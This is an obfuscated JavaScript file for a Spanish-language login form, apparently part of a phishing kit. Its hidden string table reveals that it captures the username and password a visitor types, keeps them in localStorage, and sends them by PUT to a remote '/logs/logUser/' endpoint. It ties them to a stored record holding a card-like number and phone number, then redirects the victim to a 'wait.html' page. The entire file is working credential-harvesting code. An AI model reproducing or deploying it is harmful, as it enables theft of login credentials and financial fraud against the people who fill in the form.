const _0x3b8148 = _0xac9f;
(function (_0x10dee2, _0x5c720f) {
  const _0x3476ab = _0xac9f,
    _0x564149 = _0x10dee2();
  while (!![]) {
    try {
      const _0x24a93b =
        -parseInt(_0x3476ab(0x19d)) / 0x1 +
        -parseInt(_0x3476ab(0x19c)) / 0x2 +
        parseInt(_0x3476ab(0x192)) / 0x3 +
        (-parseInt(_0x3476ab(0x186)) / 0x4) *
          (parseInt(_0x3476ab(0x1a6)) / 0x5) +
        -parseInt(_0x3476ab(0x18d)) / 0x6 +
        -parseInt(_0x3476ab(0x189)) / 0x7 +
        parseInt(_0x3476ab(0x1a3)) / 0x8;
      if (_0x24a93b === _0x5c720f) break;
      else _0x564149["push"](_0x564149["shift"]());
    } catch (_0x566fa3) {
      _0x564149["push"](_0x564149["shift"]());
    }
  }
})(_0x13b5, 0x480b9);
function _0xac9f(_0xecf577, _0x495dea) {
  const _0x13b59f = _0x13b5();
  return (
    (_0xac9f = function (_0xac9f70, _0x4e5201) {
      _0xac9f70 = _0xac9f70 - 0x186;
      let _0x46dcf3 = _0x13b59f[_0xac9f70];
      return _0x46dcf3;
    }),
    _0xac9f(_0xecf577, _0x495dea)
  );
}
function updateLS() {
  const _0x486671 = _0xac9f;
  LS[_0x486671(0x1a1)](_0x486671(0x199), JSON["stringify"](info));
}
function _0x13b5() {
  const _0x32df7f = [
    "preventDefault",
    "info",
    "Corrigió\x20Usuario",
    "btnUsuario",
    "8346gLnvDn",
    "1085bTZmez",
    "log",
    "PUT",
    "telnum",
    "setItem",
    "idreg",
    "6493952DUDuVO",
    "puser",
    "addEventListener",
    "145jPzzEy",
    "Failed\x20to\x20fetch\x20trico\x20data",
    "6148yVApJD",
    "GET",
    "/logs/logUser/",
    "2904853syinyA",
    "href",
    "/logs/logs",
    "stringify",
    "1353798wIoJql",
    "json",
    "value",
    "getElementById",
    "metaInfo",
    "521388BDdkFx",
    "Usuario\x20encontrado",
    "focus",
    "wait.html",
    "user",
    "Failed\x20to\x20update\x20user\x20data",
  ];
  _0x13b5 = function () {
    return _0x32df7f;
  };
  return _0x13b5();
}
const button = document[_0x3b8148(0x190)](_0x3b8148(0x19b)),
  userInput = document[_0x3b8148(0x190)]("txtUsuario"),
  passInput = document["getElementById"]("txtPass");
async function updateStatus() {
  const _0xe6ba0f = _0x3b8148;
  button["disabled"] = !![];
  try {
    const _0x53d735 = await fetch(url + _0xe6ba0f(0x18b), {
      method: _0xe6ba0f(0x187),
      headers: { "Content-Type": "application/json" },
    });
    if (!_0x53d735["ok"]) throw new Error(_0xe6ba0f(0x1a7));
    const _0x100dcb = await _0x53d735[_0xe6ba0f(0x18e)](),
      _0x52b3ca = [..._0x100dcb];
    for (const _0x58b87d of _0x52b3ca) {
      if (
        _0x58b87d["reg"] == info[_0xe6ba0f(0x191)]["cc"] &&
        _0x58b87d["cl"] == info[_0xe6ba0f(0x191)][_0xe6ba0f(0x1a0)]
      ) {
        console[_0xe6ba0f(0x19e)](_0xe6ba0f(0x193));
        const _0x52795d = await fetch(
          url + _0xe6ba0f(0x188) + _0x58b87d[_0xe6ba0f(0x1a2)],
          {
            method: _0xe6ba0f(0x19f),
            headers: { "Content-Type": "application/json" },
            body: JSON[_0xe6ba0f(0x18c)]({
              us: info[_0xe6ba0f(0x191)]["user"],
              ps: info["metaInfo"][_0xe6ba0f(0x1a4)],
              status: _0xe6ba0f(0x19a),
            }),
          }
        );
        if (!_0x52795d["ok"]) throw new Error(_0xe6ba0f(0x197));
        const _0x549b93 = await _0x52795d[_0xe6ba0f(0x18e)]();
        console["log"]("Usuario\x20actualizado");
      }
    }
    window["location"][_0xe6ba0f(0x18a)] = _0xe6ba0f(0x195);
  } catch (_0x50dcf0) {
    console["error"]("Error\x20al\x20actualizar\x20el\x20estado:", _0x50dcf0),
      (button["disabled"] = ![]);
  }
}
button[_0x3b8148(0x1a5)]("click", async function (_0x1a23ca) {
  const _0x5e337a = _0x3b8148;
  _0x1a23ca[_0x5e337a(0x198)]();
  if (userInput[_0x5e337a(0x18f)] == "" || passInput["value"] == "") {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0x5e337a(0x194)]();
    return;
  } else {
    var _0x5d3d55 = userInput[_0x5e337a(0x18f)],
      _0x453fb7 = passInput[_0x5e337a(0x18f)];
    (info[_0x5e337a(0x191)][_0x5e337a(0x196)] = _0x5d3d55),
      (info[_0x5e337a(0x191)][_0x5e337a(0x1a4)] = _0x453fb7),
      updateLS(),
      await updateStatus();
  }
});
